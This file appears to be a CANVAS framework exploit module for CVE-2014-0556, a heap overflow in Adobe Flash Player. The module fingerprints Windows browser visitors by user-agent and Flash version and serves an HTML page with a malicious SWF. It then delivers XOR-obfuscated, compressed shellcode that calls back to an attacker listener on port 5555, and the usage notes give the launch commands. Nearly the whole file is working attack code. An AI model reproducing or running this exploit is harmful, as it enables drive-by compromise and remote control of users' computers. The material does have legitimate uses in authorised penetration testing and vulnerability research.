#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import zlib
import re

from shellcode import shellcodeGenerator

from Crypto.Cipher import XOR
from httpclientside import httpclientside
from libs.spkproxy import header, body
from libs.ua_parser import user_agent_parser
from shellcode.standalone.windows import payloads64

from exploitutils import *
from tcpexploit import *
import canvasengine


NAME                              = 'adobe_flash_copypixelstobytearray'
DESCRIPTION                       = 'Adobe Flash Player Heap Overflow (copyPixelstoByteArray)'
DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = 'Adobe'
DOCUMENTATION['Date public']      = '09/07/2014'
DOCUMENTATION['References']       = ['http://googleprojectzero.blogspot.com.ar/2014/09/exploiting-cve-2014-0556-in-flash.html']

DOCUMENTATION['Repeatability']    = 'One-shot'
DOCUMENTATION['VersionsAffected'] = 'Adobe Flash Player before 13.0.0.244 and 14.x and 15.x before 15.0.0.152 on Windows'
DOCUMENTATION['CVE Name']         = 'CVE-2014-0556'
DOCUMENTATION['CVE Url']          = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0556'
DOCUMENTATION['Notes']            = """

This module exploits a heap based buffer overflow on Adobe Flash Player when
copying data from a BitmapData object to a ByteArray object with the position
attribute set near 0xffffffff.

It corrupts a number vector's length to obtain arbitrary memory read and write.
It bypasses ASLR leaking an object vector vtable pointer and builds the ROP
dinamically.

The x64 version of the exploits doesn't build the ROP dinamically as there
doesn't seem to be a way to read the whole memory, arrays and bytearrays
only support 32 bits indexes, so the maxium amount of memory we can read is 4GB.
Also, you need to setup a WIN64 MOSDEF INTEL listener in order for the callback
process to work, as the InjectToSelf shellcode doesn't support Universal MOSDEF
yet.


Tested on:
Windows 7 x32 SP1 with IE 8 32 bits (Flash 14.0.0.145)
Windows 7 x64 SP1 with IE 8 32 bits (Flash 14.0.0.145)

Windows 7 x64 SP1 with IE 8 64 bits (Flash 14.0.0.145)


Usage:
python ./exploits/clientd/clientd.py -l 192.168.1.10 -d 5555 -O server_port:8080 -O allowed_attack_modules:adobe_flash_regexp -O auto_detect_exploits:0
python commandlineInterface.py -v 17 -p5555
"""

VERSION                           = '1.0'
PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Clientside'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['DELIVERY']              = 'HTTP'

CHANGELOG                         = """
"""


class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version         = 0
        self.name            = NAME
        self.filename        = "%s.html" % randomstring(8)
        self.swffilename     = 'Simpsons'
        self.plugin_info     = None # we want clientd to give us a plugin dict
        self.refresh_rate    = 30
        self.xorer           = XOR.new("\x5a")
        self.badstring       = '\x00'

    def createShellcode(self, x64=False):
        if x64:
            p = payloads64.payloads()
            asm = p.InjectToSelf(self.callback.ip,
                             5555)
            bin = p.assemble(asm)
            self.shellcode = bin

        else:
            self.shellcode = self.createWin32ClientSideShellcode()

    def is_vulnerable(self, info_dict):
        parsed = user_agent_parser.Parse(info_dict['user_agent'])

        if not 'Windows' in parsed['os']['family']:
            self.log_error('Not a Windows host, aborting.')
            return 0

        if 'Win64' in info_dict['user_agent']:
            self.swffilename = 'Simpsons_x64'

        # Adobe Flash Player before 10.3.183.51 and
        # 11.x before 11.5.502.149 on Windows
        if "IE Flash" in info_dict['plugins']:
            flash          = info_dict['plugins']['IE Flash']
            version_regex = "([\d.]*\d+)"
            match         = re.search( version_regex, flash )

            # If there's no match it will throw an exception
            if match:
                flash_version  = match.group(0)
            else:
                return 0

            version_list = flash_version.split(".")

            major = int(version_list[0])
            minor = int(version_list[1])
            build = int(version_list[2])
            patch = int(version_list[3])

            if major == 14:
                if minor == 0:
                    if build == 0:
                        if patch == 5:
                            return 1
        return 0

    def makefile(self):
        """
        Makes the exploit HTML
        """
        self.getArgs()

        filedata="""        <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
        <html lang="en">
            <head>
                <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
                <title>Blank Page</title>
            </head>
            <body>
                <object classid="clsid:233C1507-6A77-46A4-9443-F871F945D258" width=600 height=430 VIEWASTEXT>
                    <param name="allowScriptAccess" value="sameDomain" />
                    <param name="allowFullScreen" value="false" />
                    <param name="movie" value="SWFFILENAME.swf" /><param name="quality" value="high" /><param name="bgcolor" value="#ffffff" />
                    <embed src="SWFFILENAME.swf" quality="high" bgcolor="#ffffff" width="550" height="400" name="SWFFILENAME"
                    align="middle" allowScriptAccess="sameDomain" allowFullScreen="false" type="application/x-shockwave-flash"
                    pluginspage="http://www.macromedia.com/go/getflashplayer" />
                </object>
            </body>
        </html>"""

        filedata = filedata.replace('SWFFILENAME', self.swffilename)
        filedata = filedata.replace('        ','')
        return filedata

    def makeSWF(self):
        with open(os.path.join(os.path.dirname(__file__), 'Resources', self.swffilename + '.swf'), 'rb') as f:
            return f.read()

    def makesploit(self, clientheader, clientbody):
        h = header('SERVER')
        b = body()

        # if there is no info about plugins, at least we can filter using
        # the user-agent making sure target is Windows
        useragent = clientheader.getStrValue(['User-Agent'])
        if "windows" in useragent.lower():
            self.log_info("This client is likely to be vulnerable")
            if 'win64' in useragent.lower():
                self.swffilename = 'Simpsons_x64'
                self.createShellcode(True)
            else:
                self.createShellcode(False)
        else:
            self.log_error("Bailing on this client as it is not likely to be vulnerable")
            return None, None

        if clientheader.URL.count(self.filename):
            self.log_info('Serving HTML file')
            sploitstring = self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type', 'text/html')

        elif clientheader.URL.count(self.swffilename):
            self.log_info('Serving SWF file')
            b.setBody(self.makeSWF())
            h.addHeader('Content-Type', 'application/x-shockwave-flash')

        elif clientheader.URL.count("code"):
            h.addHeader('Content-Type', 'application/octet-stream')
            b.setBody(self.xorer.encrypt(zlib.compress(self.shellcode)))

        else:
            self.log_info('Redirecting to self')
            h.status = '302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type', 'text/html')

        return h, b

    def getArgs(self):
        self.host=self.target.interface
        self.getarg("filename")

    def run(self):
        self.getArgs()

        # Build the html that triggers the vulnerability
        filedata = self.makefile()
        self.log_info('Opening %s for output' % self.filename)
        fd=file(self.filename, 'wb+')
        fd.write(filedata)
        fd.close()
        self.log_info('Wrote exploit HTML to %s' % self.filename)

        return 1


if __name__ == '__main__':
    print 'Running CANVAS %s Exploit v %s' % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

    if ret not in [0, 1, None]:
        ret.interact()
